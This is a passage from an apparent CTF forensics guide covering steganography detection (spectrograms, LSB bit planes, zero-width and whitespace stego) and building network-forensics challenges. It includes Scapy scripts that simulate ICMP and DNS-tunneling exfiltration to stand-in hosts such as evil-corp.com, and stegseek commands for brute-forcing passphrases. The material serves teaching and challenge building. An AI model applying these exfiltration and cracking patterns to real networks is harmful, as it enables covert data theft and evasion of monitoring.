- **Foremost:** A file carving tool typically used for data recovery, but excellent for separating concatenated files (e.g., `foremost -i polyglot.jpg`).
    
- **Hex Editor (HxD / 010 Editor):** Necessary for verifying where one file ends (e.g., looking for `FF D9` for JPEG) and the next begins, allowing for manual correction of corrupted headers.

---

#### 1. Technical Theory

Audio spectrum analysis involves visualizing sound frequencies over time, rather than just amplitude (loudness) over time.

- **Waveform:** Shows Amplitude vs. Time. Good for seeing volume changes, but hides frequency content.
    
- **Spectrogram:** Shows Frequency vs. Time, with color intensity representing Amplitude.
    
- **FFT (Fast Fourier Transform):** The mathematical algorithm used to convert the time-domain signal into the frequency domain.
    

Key Constraints:

Hidden visual data in audio (Spectrogram Steganography) often sounds like harsh static or "glitchy" chirps because the "image" introduces unnatural frequency changes. Data is frequently hidden in the high-frequency range (15kHz - 22kHz) to remain less intrusive to the human ear, or in the low-frequency range to blend with bass.

#### 2. Practical Implementation (The Investigator)

The primary goal is to switch the visualization mode from the standard waveform to a spectrogram and adjust the FFT resolution to sharpen the image.

Using Audacity:

Audacity is the standard starting point for CTF audio challenges.

1. **Load the File:** Open the audio file (`File -> Open`).
    
2. **Switch View:** Click the **Track Name** (down arrow) on the left control panel of the waveform. Select **Spectrogram**.
    
3. **Optimize Resolution (Crucial Step):**
    
    - The default view is often too blurry to read text.
        
    - Go to **Track Name -> Spectrogram Settings**.
        
    - **Window Size:** Increase this from the default (usually 256 or 1024) to **4096** or **8192**. Higher window sizes provide better _frequency_ resolution (sharper horizontal lines/text), while lower sizes provide better _time_ resolution.
        
4. **Adjust Frequency Bounds:** If the audio has a high sample rate (e.g., 44.1kHz or 48kHz), checking the scale up to 22kHz is vital. Uncheck "Use Preferences" in the settings to manually set the "Maximum Frequency" to the file's Nyquist limit (half the sample rate).
    

Using Sonic Visualiser:

Sonic Visualiser offers more granular control over color layers and is often better for faint data.

1. **Load File:** Open the audio artifact.
    
2. **Add Layer:** Go to `Layer -> Add Spectrogram` (or press `Shift + G`).
    
3. **Adjust Parameters (Right Pane):**
    
    - **Colour:** Change the color map to "White on Black" or "Fruit Salad" to maximize contrast based on the background noise.
        
    - **Threshold/Gain:** distinct knobs allow you to filter out background noise (floor) and boost the signal (ceiling) to reveal faint hidden text.
        
    - **Window:** Similar to Audacity, adjust the window overlap and size to sharpen the image.
        

Using SoX (Command Line):

For quick triage of multiple files without opening a GUI.

Bash

```
# Generate a spectrogram image from an audio file
# -n: Null output (don't play audio)
# -o: Output image name
sox input_challenge.wav -n spectrogram -o spectrogram_output.png
```

#### 3. Example Scenario

Scenario Name: "High Frequency Trader"

Description: You receive an intercepted VoIP call recording meeting_recording.wav. The audio contains normal human speech for 30 seconds, but there is a persistent, annoying high-pitched whine in the background.

Analysis:

1. The investigator opens `meeting_recording.wav` in Audacity.
    
2. The waveform looks normal (speech patterns).
    
3. Switching to **Spectrogram** view reveals a solid line at 18kHz.
    
4. Zooming in on the 18kHz-20kHz range reveals that the "whine" is actually modulated.
    
5. By increasing the **Window Size** to 8192, the modulation resolves into clear text characters running along the top of the spectrum: `FLAG{uLtRa_s0n1c_s3cr3ts}`.
    

#### 4. Key Tools

- **Audacity:** General-purpose audio editor; best for initial triage and basic spectrogram viewing.
    
- **Sonic Visualiser:** specialized tool for deep analysis; superior contrast controls and layering capabilities.
    
- **Spek:** A lightweight, drag-and-drop acoustic spectrum analyser. It is non-interactive (you cannot edit), but it is the fastest way to check a file's frequency cutoff and look for visual anomalies instantly.

---

#### 1. Technical Theory

Digital images store color data in channels (Red, Green, Blue), where each channel is typically 8 bits (1 byte) deep. These bits range from the Most Significant Bit (Bit 7, representing value 128) to the Least Significant Bit (Bit 0, representing value 1).

**Bit Plane Analysis** involves deconstructing the image into these individual layers.

- **High Bits (7-5):** Contain the structural visual data of the image.
    
- **Low Bits (2-0):** Contain fine detail and noise. In a clean image, Bit 0 usually looks like static (random noise).
    

**The Visual Anomaly:** If a hidden image or non-random data is embedded in the LSB, the "static" of Bit 0 becomes structured. Visual analysis allows an investigator to "see" the hidden artifact by isolating these specific bit planes.

**Key Constraints:**

- **Visual Detection:** Only works if the hidden data has visual structure (like a hidden QR code or another image) or if the payload is large enough to disturb the statistical randomness of the noise.
    
- **Format Sensitivity:** Highly effective on PNG/BMP. Ineffective on JPEG due to quantization artifacts.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator**

The goal is to cycle through bit planes to spot visual anomalies or automatically brute-force common LSB encoding schemes to extract text/binary payloads.

A. Automated Analysis with zsteg

zsteg is the industry-standard command-line tool for CTFs. It iterates through hundreds of LSB combinations (e.g., LSB vs MSB, RGB vs BGR ordering, XY vs YX pixel ordering).

_Installation:_

Bash

```
gem install zsteg
```

Detection Command:

Run zsteg on the target image to scan for hidden ASCII strings, file headers, or predictable patterns.

Bash

```
# -a runs all checks (more comprehensive than default)
# -v provides verbose output to see what is being checked
zsteg -a -v suspect_logo.png
```

Extraction Command:

If zsteg identifies a payload (e.g., it detects a ZIP file signature at b1,r,lsb,xy), extract it specifically:

Bash

```
# Syntax: zsteg -E <payload_signature> <image> > <output_file>
zsteg -E b1,r,lsb,xy suspect_logo.png > extracted_data.zip
```

B. Manual Visual Analysis with StegSolve

StegSolve is a Java-based GUI tool required when the hidden data is visual (e.g., a QR code painted on the Alpha channel) rather than a byte stream.

1. **Launch:** `java -jar stegsolve.jar`
    
2. **Load:** File -> Open -> `suspect_logo.png`
    
3. **Cycle Planes:** Use the `<` and `>` arrow buttons at the bottom.
    
    - Look for "Red plane 0", "Green plane 0", "Blue plane 0", and "Alpha plane 0".
        
    - **CTF Hint:** If the LSB plane looks like solid black or specific patterns rather than random static, there is hidden data.
        
4. **Data Extraction (Stereogram/Interleaved):**
    
    - Go to `Analyse` -> `Data Extract`.
        
    - Select the specific bits identified during the visual check (e.g., Red 0, Green 0, Blue 0).
        
    - Click `Save Bin` to dump the raw bytes, or `Preview` to see if the hex dump reveals a flag header.
        

#### 3. Example Scenario

Title: The Ghost in the Shell

Scenario: A malware C2 server was taken down, and investigators recovered a file named profile_pic.png. The file size is slightly larger than expected for its resolution. Running strings yielded nothing.

Analysis:

1. The investigator opens `profile_pic.png` in **StegSolve**.
    
2. Pressing `>` 12 times reveals "Blue Plane 0".
    
3. Instead of static noise, the top-left corner of the "Blue Plane 0" view shows a distinct QR code pattern.
    
4. The investigator takes a screenshot of this plane, inverts the colors if necessary, and scans the QR code with a phone or `zbarimg`.
    
5. **The Flag:** The QR code decodes to `flag{v1su4l_plane_1nsp3ct10n_succ3ss}`.
    

#### 4. Key Tools

- **zsteg:** (Ruby) Best for command-line automation and text/file extraction. Checks hidden data in LSB, ZLIB compression, and OpenStego types.
    
    - _Repo:_ [https://github.com/zed-0xff/zsteg](https://github.com/zed-0xff/zsteg)
        
- **StegSolve:** (Java) Best for visual inspection of specific bit planes and frame analysis (for GIFs).
    
    - _Download:_ [http://www.caesum.com/handbook/StegSolve.jar](https://www.google.com/search?q=http://www.caesum.com/handbook/StegSolve.jar)
        
- **StegOnline:** (Web) A browser-based alternative to StegSolve that allows for bit plane browsing and transformation without installing local tools.

---

### Zero-width character injection and whitespace manipulation (SNOW)

#### 1. Technical Theory

For the investigator, steganalysis of text files requires specialized tools to make invisible characters visible or to calculate statistical anomalies caused by the hidden data.

- **Zero-Width Character Detection:** The challenge is that standard text editors filter or render these Unicode characters (`U+200B`, `U+200C`, etc.) as nothing. Investigators must use tools that force the display of **non-printable characters** or view the file in its **raw hex/UTF-8 byte sequence** to detect the injection points. The UTF-8 representation of the Zero Width Space (`U+200B`) is the byte sequence **`E2 80 8B`**.
    
- **Whitespace Steganalysis (SNOW):** This relies on finding **trailing whitespace** (`09` for Tab, `20` for Space) at the end of text lines. Standard Unix tools like `cat` and web browsers automatically trim this, hiding the data. Detection tools must read the file line-by-line, including all trailing characters, and then interpret the sequence of tabs and spaces as encoded bits, usually followed by decryption.
    

---

#### 2. Practical Implementation (The "How-To")

As **The Investigator**, your analysis must first differentiate between the two types of text steganography and then apply the appropriate detection method.

A. Zero-Width Character Detection (The Hex View)

The most reliable method is to view the raw UTF-8 encoding to spot the invisible bytes.

Bash

```
# 1. Use 'xxd' to dump the file in hex mode with character representation
# The '-c 12' limits the output to 12 bytes per line for better focus.
xxd -c 12 system_log_zw.txt | less

# Look for patterns of 'E2 80 8B' (ZWSP) or 'E2 80 8C' (ZWNJ) interspersed
# between the standard ASCII text characters.

# Example of what you might spot:
# 0000000: 5468 6973 E280 8B E280 8C E280 8B 6c6f 6f6b  This...look
#         ^ Visible character  ^ ZW characters  ^ Visible character
```

Alternatively, use a tool or script that specifically strips and displays the Unicode control characters.

B. Whitespace Manipulation (SNOW) Detection and Extraction

Use the stegsnow utility in decode mode, supplying the password if known, or using a common wordlist.

Bash

```
# 1. Use 'cat -A' or 'vi -b' to manually confirm trailing whitespace
# $ denotes end of line, ^I denotes Tab.
cat -A poem_stego.txt
# Output example:
# The quick brown fox jumps over the lazy dog. ^I ^I $
# Documentation for the server protocol. $

# 2. Use stegsnow in decode mode (-D)
# If a password was required by the architect:
stegsnow -D -p "admin123" poem_stego.txt

# If no password was required (common CTF setup):
stegsnow -D poem_stego.txt

# Output will be the extracted plaintext message:
# CTF{wh1t3_sp4c3_gh0st}
```

C. Automated Online Decoding (ZW-Steg)

For challenges that use standard zero-width patterns, online tools like ZwSteg decoders can be used to paste the text and reveal the embedded message.

---

#### 3. Example Scenario

**Scenario Title:** "The Invisible Contract Analysis"

The Challenge:

You have employment_contract.txt. Visual inspection shows no anomalies. The previous investigator found a hint of Zero-Width characters in the first paragraph that reads: "Use SNOW on the last paragraph." You need to find the full flag.

**The Solution Steps:**

1. **Confirming Zero-Width Artifact:** You use the **Python script** (or `xxd` command) to confirm the existence of `E2 80 8B` sequences in the first paragraph, confirming the _method_ used.
    
2. **SNOW Extraction:** You locate the last paragraph, which, when viewed with `cat -A`, shows heavy **trailing whitespace**.
    
3. **Flag Recovery:** Since the challenge implies the password was found previously, you use `stegsnow -D -p <password>` on the file.
    
4. The output reveals the flag: `CTF{7r41l1ng_by73s_r3v34l_4ll}`.
    

---

#### 4. Key Tools

- **xxd / Hex Editors (e.g., bless, HxD):** Fundamental for manual detection by viewing raw byte streams and UTF-8 sequences (`E2 80 8B` and `09`/`20`).
    
- **stegsnow (or snow):** Essential CLI tool for decoding whitespace steganography.
    
- **`cat -A` (or `vim -b`):** Standard *nix utilities used for triage; they reveal non-printable characters like tabs (`^I`) and end-of-line markers (`$`), indicating trailing whitespace.
    
- **Online ZW Decoders:** Tools like ZwSteg or custom Python scripts that map `\u200b` and `\u200c` sequences back to binary, and then to ASCII text.

---

### Steganalysis detection tools

#### 1. Technical Theory

Steganalysis is the art and science of detecting the presence of hidden information within a carrier file (stegogram). Unlike cryptanalysis, which aims to decode the message, the primary goal of steganalysis is to determine _if_ a message exists.

- **Statistical Anomalies:** Embedding data often alters the statistical properties of the cover file. For example, in LSB (Least Significant Bit) steganography, the randomness of the LSBs in a natural image increases significantly when encrypted data is embedded. Tools analyze these histograms (e.g., Chi-Square attack) to find deviations from the expected norm.
    
- **File Structure & Metadata:** Poorly implemented steganography often leaves artifacts, such as appended data after the End of File (EOF) marker, inconsistent file sizes relative to the resolution/bitrate, or specific metadata tags left by the embedding software (e.g., "Creator: Adobe Photoshop" vs. "Creator: OpenStego").
    
- **Visual/Aural Attacks:** For images and audio, visualising specific bit planes or frequency spectrums can reveal patterns that look like "static" or structured noise, indicating hidden payloads.
    

#### 2. Practical Implementation (The "How-To")

As **The Investigator**, your goal is to triage a suspect file to identify _which_ steganography technique was used.

A. Automated LSB & ZLIB Detection (Linux - zsteg)

zsteg is the "swiss army knife" for PNG and BMP files. It iterates through hundreds of zlib, LSB, and color channel combinations.

Bash

```
# basic usage: tries all standard combinations
zsteg -a suspect_logo.png

# specific channel analysis (e.g., looking at the alpha channel only)
zsteg -c a suspect_logo.png

# extracting a payload found at a specific offset/mask
zsteg -E "b1,rgb,lsb,xy" suspect_logo.png > extracted_payload.bin
```

B. Bulk LSB Analysis (Java - StegExpose)

If you have a directory of images and need to find which one has LSB data without checking them one by one, use StegExpose. It uses statistical tests (RS Analysis, Sample Pairs) to rate the probability of hidden data.

Bash

```
# Syntax: java -jar StegExpose.jar [directory] [speed] [threshold] [csv_output]
# Detect hidden data in the "images" folder with a threshold of 0.2
java -jar StegExpose.jar images/ default 0.2 report.csv
```

C. Visual Bit Plane Analysis (GUI - StegSolve)

For manual inspection, StegSolve allows you to walk through bit planes.

1. Launch tool: `java -jar StegSolve.jar`
    
2. Open the suspect image.
    
3. Use the left/right arrows to cycle through filters.
    
4. **Look for:**
    
    - **Random Noise at Bit 0:** In a clean image, R/G/B plane 0 usually shows structure. If it looks like pure television static while plane 1 has structure, it's likely LSB steganography.
        
    - **Stereograms:** If shifting the image reveals a hidden visual pattern.
        
5. **Extract Data:** Go to "Analyse" -> "Data Extract" to pull raw bits from specific planes (e.g., Red 0, Green 0, Blue 0).
    

D. Cracking Passwords (Linux - stegseek)

If you suspect steghide was used (common in JPEGs), use stegseek to brute-force the passphrase using a wordlist (e.g., rockyou.txt). It is thousands of times faster than the original tool.

Bash

```
# Brute force a JPEG file
stegseek suspected_photo.jpg /usr/share/wordlists/rockyou.txt

# If successful, it will output "suspected_photo.jpg.out"
```

#### 3. Example Scenario

**Scenario Title:** "Needle in a Haystack"

The Challenge:

You are provided with a folder containing 50 "employee profile pictures" (PNG format) and told that a disgruntled employee hid a leak code in one of them.

**The Solution:**

1. **Triage:** You run `java -jar StegExpose.jar profiles/` to analyze the directory. The tool outputs a score for each image. 49 images have scores below `0.1`, but `employee_42.png` has a score of `0.85`.
    
2. **Confirmation:** You isolate `employee_42.png` and run `zsteg -a employee_42.png`.
    
3. **Extraction:** `zsteg` output reveals: `b1,b,lsb,xy .. text: "Flag{stat1st1cal_an0maly_d3t3ct3d}"`.
    

#### 4. Key Tools

- **zsteg:** Best for command-line detection of LSB, MSB, and Zlib payloads in PNG/BMP.
    
- **StegSolve:** Essential Java GUI for visually inspecting bit planes and extracting specific bit-streams manually.
    
- **stegseek:** The fastest tool for detecting and cracking `steghide` archives (JPEGs/WAVs).
    
- **StegExpose:** Statistical analysis tool for detecting LSB steganography in bulk image sets.
    
- [Steganography CTF walkthroughs including StegSolve and zsteg](https://www.youtube.com/watch?v=7In6yuM-OWw)
    

This video provides a practical visual walkthrough of using several of the tools mentioned above, specifically `StegSolve` and `zsteg`, in a CTF context.

---

# Module 3: Network Forensics (Packet Analysis)

## The Architect (Creation)

### Generating synthetic traffic with Python (Scapy)

#### 1. Technical Theory

Scapy is a powerful interactive packet manipulation program and library for Python. unlike standard network socket programming which interacts with the Application layer (Layer 7) and relies on the Operating System to handle lower-level details (headers, handshakes, checksums), Scapy allows the architect to construct packets byte-by-byte from the Data Link layer (Layer 2) upwards.

This capability allows for the creation of "impossible" packets (e.g., TCP packets with conflicting flags), spoofed source IP addresses, and custom payloads injected into specific protocol fields without the OS interfering or "fixing" the packet structure. In Scapy, protocols are stacked using the division operator (`/`).

**Key Constraints:**

- **Privileges:** Scapy requires root (Linux) or Administrator (Windows) privileges to open raw sockets for sending packets.
    
- **Checksums:** Scapy automatically calculates checksums when creating packets unless explicitly told not to, ensuring the generated traffic looks valid to analysis tools like Wireshark.
    

#### 2. Practical Implementation (The "How-To")

To create a CTF challenge, you typically generate traffic and save it to a PCAP file (`.pcap` or `.pcapng`) rather than sending it live over a network interface.

Step 1: Setup and Basic Stacking

Install Scapy: pip install scapy

Step 2: Creating a "Covert Channel" Challenge (ICMP Exfiltration)

This script generates a PCAP file containing a sequence of ICMP (Ping) requests. The flag is hidden inside the "padding" or payload section of the ICMP packets, split across multiple requests to force the investigator to reconstruct the stream.

Python

```
from scapy.all import *

# Configuration
output_file = "icmp_covert_channel.pcap"
target_ip = "10.10.10.5"
source_ip = "192.168.1.100"
flag = "FLAG{scapy_m4st3r_builder}"
packets = []

# Create noise (normal packets)
for i in range(5):
    # Standard ping with default padding
    packets.append(IP(src=source_ip, dst=target_ip)/ICMP()/Padding(load=b"\x00"*48))

# Inject the flag (One character per packet)
# We hide the character in the payload field
for char in flag:
    # Construct the packet layers
    # Layer 3: IP (Spoofed IPs)
    # Layer 4: ICMP (Echo Request is Type 8)
    # Raw: The data payload
    pkt = IP(src=source_ip, dst=target_ip) / ICMP(type=8) / Raw(load=char.encode())
    packets.append(pkt)

# Create more noise
for i in range(5):
    packets.append(IP(src=source_ip, dst=target_ip)/ICMP()/Padding(load=b"\x00"*48))

# Write to PCAP file
wrpcap(output_file, packets)

print(f"[+] Generated {len(packets)} packets and saved to {output_file}")
```

Step 3: Creating a "Knock Sequence" (Port Scanning Pattern)

This script creates a specific pattern of SYN packets to different ports. The ports themselves, when concatenated, might form the flag (e.g., Port 70, Port 76, Port 65... -> ASCII).

Python

```
from scapy.all import *

target_ip = "10.10.10.5"
flag_ports = [70, 76, 65, 71] # ASCII for F, L, A, G
packets = []

# Base sequence number
seq_num = 1000

for port in flag_ports:
    # Create a TCP SYN packet
    # flags="S" denotes a SYN packet
    pkt = IP(dst=target_ip) / TCP(dport=port, flags="S", seq=seq_num)
    packets.append(pkt)
    seq_num += 1

wrpcap("port_knock.pcap", packets)
```

#### 3. Example Scenario

Scenario Name: "Echoes in the Void"

Description: Participants are provided a file named traffic.pcap. The scenario prompt states: "We detected strange heartbeat signals leaving our server. It looks like standard network diagnostics, but the admin insists they didn't run any tests."

The Setup:

1. The Architect uses Scapy to generate 500 ICMP Echo Request/Reply packets.
    
2. Most packets contain standard 48-byte null padding.
    
3. Every 10th packet contains a chunk of a base64 encoded string in the `load` field instead of null bytes.
    
4. The investigator must filter for ICMP traffic, examine the data payloads, extract the non-null bytes, concatenate them, and decode the base64 string to reveal the flag.
    

#### 4. Key Tools

- **Scapy:** The primary library for programmatic packet generation.
    
- **Tcpreplay:** A command-line tool used to replay the generated PCAP files back onto a live interface to test if IDS/IPS systems trigger on the synthetic attack.
    
- **Wireshark / TShark:** Used to verify the structure of the generated PCAP file to ensure the challenge is solvable (i.e., checking if the flag is actually visible/extractable).

---

### Simulating data exfiltration via DNS tunneling or ICMP payloads

#### 1. Technical Theory

**DNS Tunneling:** Domain Name System (DNS) is a foundational protocol (UDP port 53) often left open on firewalls. Tunneling involves encapsulating non-DNS data (like command output or files) within the legitimate fields of a DNS query or response.

- **Mechanism:** The client encodes data (Base64/Hex) and places it in the **QNAME** (Query Name) field (e.g., `[encoded_secret].attacker.com`). The rogue DNS server receives the query, decodes the subdomain, and logs the data.
    
- **Key Constraints:** A single DNS label is limited to 63 characters; the total domain name length is limited to 255 characters. This requires chunking large data into multiple packets.
    

**ICMP Exfiltration:** Internet Control Message Protocol (ICMP) is used for diagnostics (Ping). An Echo Request (Type 8) contains a data payload section, usually filled with padding bytes (e.g., `abcdef...`).

- **Mechanism:** The attacker replaces the standard padding with sensitive data.
    
- **Key Constraints:** If the data exceeds the Maximum Transmission Unit (MTU), usually 1500 bytes, fragmentation occurs, which creates noise. CTF challenges often use small payloads per packet to avoid this.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Architect (Creation)**

To create a clean CTF challenge (`.pcap` file), use Python with **Scapy**. This allows you to craft precise packets without needing to set up actual C2 infrastructure.

Method 1: ICMP Payload Injection (Scapy)

This script takes a flag, splits it, and hides it across multiple ping requests inside the generated PCAP.

Python

```
from scapy.all import *

def create_icmp_exfil_pcap(output_filename, target_ip, flag):
    """
    Hides a flag inside the payload of ICMP Echo Requests.
    """
    packets = []
    id_counter = 1000
    seq_counter = 1
    
    print(f"[+] crafting ICMP packets for flag: {flag}")
    
    # Option A: One character per packet (High traffic volume challenge)
    # Option B: Chunked string. Let's do chunks of 4 bytes.
    chunks = [flag[i:i+4] for i in range(0, len(flag), 4)]
    
    for chunk in chunks:
        # Create IP Layer
        ip_layer = IP(src="192.168.1.105", dst=target_ip)
        
        # Create ICMP Layer (Type 8 = Echo Request)
        # We pad the chunk to look slightly more like standard padding if desired, 
        # or leave it raw to make it obvious for beginners.
        payload = chunk.encode('utf-8')
        
        icmp_layer = ICMP(type=8, code=0, id=id_counter, seq=seq_counter)
        
        # Stack layers and add payload
        pkt = ip_layer / icmp_layer / payload
        packets.append(pkt)
        
        seq_counter += 1
        
    # Write to PCAP
    wrpcap(output_filename, packets)
    print(f"[+] PCAP generated: {output_filename}")

if __name__ == "__main__":
    create_icmp_exfil_pcap("icmp_covert.pcap", "10.0.0.1", "CTF{P1ng_P0ng_P4yl0ad}")
```

Method 2: DNS Tunneling Simulation (Scapy)

This script simulates an infected client querying a C2 server, where the flag is encoded in hex within the subdomains.

Python

```
import binascii
from scapy.all import *

def create_dns_tunnel_pcap(output_filename, domain_suffix, flag):
    """
    Encodes a flag into DNS A-record queries.
    Format: <hex_encoded_part>.evil-corp.com
    """
    packets = []
    
    # Convert flag to hex to ensure it's DNS-safe
    flag_hex = binascii.hexlify(flag.encode('utf-8')).decode('utf-8')
    
    # Split into chunks (max 63 chars per label, stay safe with 30)
    chunk_size = 30
    chunks = [flag_hex[i:i+chunk_size] for i in range(0, len(flag_hex), chunk_size)]
    
    print(f"[+] Crafting DNS queries for domain: *.{domain_suffix}")
    
    for i, chunk in enumerate(chunks):
        # Construct the malicious FQDN
        # Example: 4354467b.evil-corp.com
        query_name = f"{chunk}.{domain_suffix}"
        
        # IP / UDP / DNS Layers
        ip = IP(src="192.168.1.50", dst="8.8.8.8")
        udp = UDP(sport=RandShort(), dport=53)
        
        # rd=1 (Recursion Desired) is standard for client queries
        dns = DNS(rd=1, qd=DNSQR(qname=query_name, qtype="A"))
        
        pkt = ip / udp / dns
        packets.append(pkt)
        
    wrpcap(output_filename, packets)
    print(f"[+] PCAP generated: {output_filename}")

if __name__ == "__main__":
    create_dns_tunnel_pcap("dns_tunnel.pcap", "bad-actor.org", "CTF{DNS_Qu3r1es_Ar3_N0isy}")
```

#### 3. Example Scenario

Title: The Domain of Mysteries

Scenario: A firewall log shows a workstation making thousands of DNS requests to cdn-update-check.xyz. The requests were permitted because they were standard UDP port 53 traffic.

The Artifact: A 5MB PCAP file containing minimal HTTP traffic but heavy DNS traffic.

The Clue: The subdomains look like random alphanumeric strings (T4k3M3.cdn-update-check.xyz, T0Y0uR.cdn-update-check.xyz, L34d3r.cdn-update-check.xyz).

The Solution: The investigator must extract the subdomains, remove the base domain suffix, concatenate the strings, and decode them (Base64) to reveal the flag (or a binary executable).

#### 4. Key Tools

- **Scapy:** The primary Python library for packet manipulation, essential for crafting custom headers and payloads programmatically.
    
- **Iodine / Dnscat2:** Real-world tools used to create DNS tunnels. Architects often run these tools in a VM and capture the traffic to create "realistic" (rather than scripted) datasets.
    
- **Wireshark / Tshark:** Used to verify that the generated PCAP opens correctly and that the payloads are visible but properly encapsulated.

---

### Creating "Needle in a Haystack" scenarios (burst traffic).

#### 1. Technical Theory

In network forensics, a "Needle in a Haystack" scenario involves hiding a specific, low-volume signal (the flag or evidence) within a high-volume, noisy environment (the haystack).

**Burst Traffic** refers to sudden, high-bandwidth spikes in network activity. Architects utilize these bursts to create a "smokescreen." By flooding the capture with innocuous data—such as video streaming (UDP/RTP), large file transfers (FTP/HTTP), or extensive database queries—the investigator's analysis tools (like Wireshark) become visually cluttered.

**Key Constraints:**

- **Signal-to-Noise Ratio (SNR):** The malicious traffic must be statistically insignificant compared to the benign traffic (e.g., 1 packet vs. 50,000 packets).
    
- **Protocol Consistency:** The "noise" must be valid protocol traffic. If the noise consists of malformed packets, Wireshark's coloring rules will highlight them, inadvertently drawing attention to the anomaly or making the clean "needle" stand out.
    
- **Temporal Cohesion:** The needle should ideally occur _during_ the burst to maximize the concealment effect.
    

#### 2. Practical Implementation (Creation)

The most effective method involves generating authentic "noise" and "signal" separately, then merging them.

Method 1: The Mergecap Approach (Tool-based)

This is the most realistic method. You capture real background traffic (browsing, streaming) and merge it with a crafted attack packet.

1. Generate the Haystack (Noise):
    
    Start a capture on your interface (e.g., eth0). Open multiple tabs, stream a 4K video, or run a speed test to generate thousands of packets quickly. Save this as noise.pcap.
    
    Bash
    
    ```
    tcpdump -i eth0 -w noise.pcap
    ```
    
2. Generate the Needle (The Flag):
    
    Create a separate, minimal capture containing the flag. For example, sending a flag via a covert ICMP payload.
    
    Bash
    
    ```
    # Terminal 1: Start capturing the needle
    tcpdump -i lo -w needle.pcap
    
    # Terminal 2: Send the payload (localhost)
    python3 -c "import os; os.system('ping -c 1 -p ' + 'flag{bur5t_m0d3}'.encode('utf-8').hex() + ' 127.0.0.1')"
    
    # Stop the capture in Terminal 1
    ```
    
3. Merge the Captures:
    
    Use mergecap (part of the Wireshark suite) to combine them. The -w flag specifies the output.
    
    Bash
    
    ```
    mergecap -w challenge.pcap noise.pcap needle.pcap
    ```
    

Method 2: The Scapy Approach (Scripted Generation)

For precise control over timestamps and protocol fields, Python with Scapy is superior. This script generates a flood of HTTP traffic and hides a single DNS packet containing the flag.

Python

```
from scapy.all import *
import random

output_file = "haystack_challenge.pcap"
packets = []

# Configuration
noise_count = 2000  # Number of noise packets
flag = "flag{n01s3_c4nc3ll4t10n}"

# 1. Generate the Haystack (HTTP Noise)
print(f"Generating {noise_count} packets of HTTP noise...")
for _ in range(noise_count):
    # Randomize IPs to simulate a busy network
    src_ip = f"192.168.1.{random.randint(2, 254)}"
    dst_ip = "104.21.55.2" # Example CDN IP
    
    # Create a generic TCP SYN/ACK sequence or just data push
    pkt = IP(src=src_ip, dst=dst_ip)/TCP(dport=80, flags="PA")/Raw(load="GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n")
    packets.append(pkt)

# 2. Create the Needle (DNS TXT Record)
# We hide the flag in a DNS query for a strange subdomain
print("Injecting the needle...")
needle_src = "192.168.1.105" # Target suspect IP
needle_dst = "8.8.8.8"

# Encoding the flag in the query name or TXT record
# Here we simulate a query for the flag as a subdomain
dns_query = DNS(rd=1, qd=DNSQR(qname=f"{flag}.malicious-site.com"))
needle_pkt = IP(src=needle_src, dst=needle_dst)/UDP(dport=53)/dns_query

# 3. Insert the needle randomly into the haystack
insert_index = random.randint(noise_count // 3, (noise_count // 3) * 2)
packets.insert(insert_index, needle_pkt)

# 4. Write to disk
print(f"Writing to {output_file}...")
wrpcap(output_file, packets)
print("Done.")
```

#### 3. Example Scenario

Challenge Name: "Stream Snipe"

Scenario Description: Corporate security noticed a brief unauthorized data transfer alarm triggered during the CEO's weekly all-hands video stream. The network logs show gigabytes of UDP video traffic.

The Artifact: A 500MB PCAP file mostly consisting of RTP/UDP packets (video stream data).

The Solution: The investigator must filter out the high-volume UDP traffic. The flag flag{udp_flood_hidden_tcp} is hidden in the payload of a single TCP Retransmission packet that occurred exactly at the peak of the video bitrate spike, making it invisible on standard I/O graphs unless zoomed in significantly.

#### 4. Key Tools

1. **Scapy:** A powerful interactive packet manipulation program. It is the primary tool for programmatic packet generation and forging specific artifacts.
    
2. **Mergecap:** A command-line tool included with Wireshark used to combine multiple saved capture files into a single output file. Essential for blending "clean" attack captures with "dirty" noise captures.
    
3. **Tcpreplay:** A suite of tools used to replay previously captured traffic on a live network. Useful if you want to capture the "noise" passing through a specific firewall or intrusion detection system (IDS) to see if it modifies the stream before saving the final challenge.

---

### Implementing SSL/TLS traffic with provided (but hidden) session keys

#### 1. Technical Theory

![Image of SSL/TLS handshake process](https://encrypted-tbn3.gstatic.com/licensed-image?q=tbn:ANd9GcSXN5dAAplcJrJN0bdbUttnH8GUb53t44XF-z_vcl5MQHdeGBwbZqhmI3rbCCK7534N08TdlbR0xURQKGLXS3khRGAJoaaZjKTQ2MMZ-Nnk_Qxc62M)

Shutterstock

Explore

Transport Layer Security (TLS) ensures privacy by encrypting data between a client and a server. In modern TLS (v1.2 and v1.3), **Perfect Forward Secrecy (PFS)** is often used (via Ephemeral Diffie-Hellman), meaning that even if an investigator possesses the server's private RSA key later, they cannot decrypt past traffic.

To decrypt this traffic in a CTF context without downgrading the security, the investigator requires the **Session Keys** (specifically the Master Secret). Most TLS clients (browsers, curl, Python requests) support the `SSLKEYLOGFILE` standard. This environment variable forces the client to dump the session secrets to a specified text file. When loaded into Wireshark alongside the PCAP, these keys allow for full decryption of the application layer data (HTTP).

**Key Constraints:** The challenge relies on the solver understanding that they need the specific `CLIENT_RANDOM` mapping to the `MASTER_SECRET`. The PCAP alone is useless.

#### 2. Practical Implementation (The "How-To")

To create this challenge, you must simultaneously capture network traffic and force the client to log session keys. Then, you separate the keys from the PCAP and hide them in a secondary artifact.

Step 1: Setup the Environment and Key Logging

We will use a standard Linux environment. We set the SSLKEYLOGFILE variable, which tells compatible applications where to write the secrets.

Bash

```
# 1. Define the key log location
export SSLKEYLOGFILE=$(pwd)/session_keys.log

# 2. Start the packet capture in the background
# We filter for port 4433 (our custom HTTPS port) or generic traffic
tcpdump -i any -w challenge_traffic.pcap port 4433 &
TCPDUMP_PID=$!

# Give tcpdump a moment to start
sleep 2
```

Step 2: Generate HTTPS Traffic

You need a server and a client. A simple Python script can act as a server. For the client, curl honors the environment variable.

_Server Setup (save as `server.py`):_

Python

```
import http.server
import ssl

# You must generate a self-signed cert first:
# openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes -subj "/CN=secret-corp.local"

server_address = ('localhost', 4433)
httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)

# Wrap the socket with SSL
ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
ctx.load_cert_chain(certfile='./server.pem')
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)

print("Serving HTTPS on port 4433...")
httpd.serve_forever()
```

_Client Execution (Triggering the traffic):_

Bash

```
# 3. Make a request containing the "Flag"
